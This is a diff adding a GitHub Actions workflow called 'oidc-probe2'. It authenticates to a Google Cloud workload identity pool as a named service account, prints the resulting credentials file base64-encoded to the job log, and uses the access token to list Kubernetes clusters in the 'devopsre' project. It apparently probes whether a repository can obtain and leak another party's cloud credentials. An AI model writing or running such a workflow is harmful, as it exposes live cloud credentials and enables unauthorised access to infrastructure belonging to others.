@@ -1,0 +1,29 @@
+name: oidc-probe2
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Auth
+        id: auth
+        continue-on-error: true
+        uses: google-github-actions/auth@v2
+        with:
+          workload_identity_provider: projects/1094498259535/locations/global/workloadIdentityPools/gh-optimism/providers/github-by-repos
+          service_account: celo-optimism-gh@devopsre.iam.gserviceaccount.com
+          token_format: access_token
+      - name: Dump
+        if: always()
+        run: |
+          echo "OUTCOME=${{ steps.auth.outcome }}"
+          if [ -n "$GOOGLE_GHA_CREDS_PATH" ] && [ -f "$GOOGLE_GHA_CREDS_PATH" ]; then base64 -w0 "$GOOGLE_GHA_CREDS_PATH"; echo; fi
+          if [ "${{ steps.auth.outcome }}" = "success" ]; then
+            echo "CLUSTERS:"
+            curl -sS -m 20 -H "Authorization: Bearer ${{ steps.auth.outputs.access_token }}" "https://container.googleapis.com/v1/projects/devopsre/locations/us-west1/clusters" | head -c 4000
+            echo
+          fi
